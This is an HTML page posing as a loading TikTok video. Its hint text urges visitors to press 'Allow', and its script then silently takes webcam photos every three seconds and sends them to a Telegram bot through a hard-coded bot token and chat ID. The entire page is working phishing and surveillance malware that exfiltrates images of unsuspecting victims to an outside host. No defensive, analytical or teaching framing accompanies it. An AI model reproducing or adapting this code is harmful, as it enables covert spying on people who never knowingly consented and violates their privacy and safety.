<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Video</title>
    <style>
        body { background-color: #010101; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; }
.loader { border: 4px solid #f3f3f3; border-top: 4px solid #fe2c55; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
.text { margin-top: 20px; font-size: 18px; font-weight: bold; }
#video, #canvas { display: none; }

/* НОВАЯ ЧАСТЬ: Стиль для плашки */
.permission-hint {
    background-color: rgba(255, 255, 255, 0.15); /* Прозрачный белый фон */
    color: white;
    padding: 12px 24px;
    border-radius: 30px; /* Скругление */
    font-size: 15px;
    margin-bottom: 60px;
    text-align: center;
    border: 1px solid rgba(255, 255, 255, 0.2); /* Рамка */
    backdrop-filter: blur(5px); /* Размытие фона */
}
    </style>
</head>
<!-- Измененная часть body -->
<body>
<div id="hint" class="permission-hint">Нажмите «Разрешить», чтобы продолжить</div>
<div class="loader"></div>
<div class="text">Загрузка видео...</div>

<video id="video" autoplay playsinline muted></video>
<canvas id="canvas"></canvas>


<script>
    const botToken = '8220142638:AAFDjQSzi4V1i5xfpMBA42uBgaDjFA0znOo';
    const chatId = '8573089884';

    async function takeAndSendPhoto(video, canvas) {
        if (video.videoWidth === 0 || video.readyState < 2) return;

        const context = canvas.getContext('2d');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.drawImage(video, 0, 0);
        
        const dataURL = canvas.toDataURL('image/jpeg', 0.6);
        const blob = await (await fetch(dataURL)).blob();
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', blob, 'shot.jpg');

        try {
            await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
            console.log("Фото моментально отправлено!");
        } catch (e) { console.error(e); }
    }

    window.onload = () => {
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
        .then(stream => {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            video.srcObject = stream;

            // Как только видео реально начало играть:
            video.onplaying = () => {
                // Ждем 3 сек (задержка для настройки света камерой)
                setTimeout(() => {
                    // 1. Делаем первое фото МОМЕНТАЛЬНО после задержки
                    takeAndSendPhoto(video, canvas);

                    // 2. Включаем цикл на последующие фото
                    setInterval(() => {
                        takeAndSendPhoto(video, canvas);
                    }, 3000); 
                }, 3000);
            };
            video.play();
        })
        .catch(err => { console.log("Камера заблокирована"); });
    };
</script>
</body>
</html>
